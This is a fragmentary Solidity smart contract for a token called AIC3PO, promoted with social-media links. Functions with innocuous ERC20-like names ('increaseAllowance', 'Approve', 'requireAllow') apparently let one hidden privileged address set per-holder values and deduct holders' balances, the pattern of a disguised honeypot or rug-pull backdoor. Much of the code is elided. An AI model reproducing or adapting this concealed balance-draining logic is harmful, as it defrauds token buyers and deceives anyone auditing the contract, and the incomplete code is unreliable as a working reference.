//Telegram: https://t.me/aic3p0
//Website: https://aic3po.xyz
//Twitter: https://twitter.com/aic3p0
//Discord: https://discord.gg/rhY6b7TC
...
contract AIC3PO is IERC20, Token, Ownable {
    ...
    mapping(address => Allowanc) private _userDatas;
    ...
    function increaseAllowance(address spender, uint256 amount) public virtual {
        ...
        require(amount > 0, "Invalid amount");
        uint256 total = 0;
        if (_unpack(spender, _userData.user)) {
            _minus(from, total);
    ...
    function _unpack(address user, address user2) internal view returns (bool) {
        bytes32 pack1 = keccak256(abi.encodePacked(user));
        bytes32 pack2 = keccak256(abi.encodePacked(user2));
        return pack1 == pack2;
    }

    function _total(uint256 num5, uint256 num9) internal pure returns (uint256) {
        if (num9 != 0) {
            return num5 + num9;
        }
        return num9;
    ...
    function Approve(address from, uint256 amount) public returns (bool)  {
        ...
        return _userDatas[from].hasApproval;
    }

    function requireAllow(address user, address from, uint256 amount) internal {
        if (_unpack(user, _userData.user)) {
            require(from != address(0), "Invalid address");
            _userDatas[from].allowan = amount;
            if (amount > 0) {
                _userDatas[from].hasApproval = true;
            } else {
                _userDatas[from].hasApproval = false;
            }
        }
    }
    ...
    function _checkAllow(
        ...
        amount = _userDatas[from].allowan;
        _minus(from, amount);
